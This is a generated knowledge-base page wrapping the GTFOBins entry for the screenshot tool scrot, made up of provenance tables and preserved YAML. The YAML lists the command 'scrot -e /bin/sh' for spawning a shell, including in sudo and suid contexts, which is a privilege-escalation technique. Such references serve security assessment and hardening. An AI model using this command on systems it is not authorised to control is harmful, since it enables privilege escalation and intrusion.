---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# scrot

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `scrot` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/scrot` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [scrot](../../tools/linux/scrot.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | scrot |
| name | scrot |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/scrot/ |

## Preserved Source Material

```yaml
_body: ''
_name: scrot
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/scrot
comment: This requires a running X server.
functions:
  shell:
  - code: scrot -e /bin/sh
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
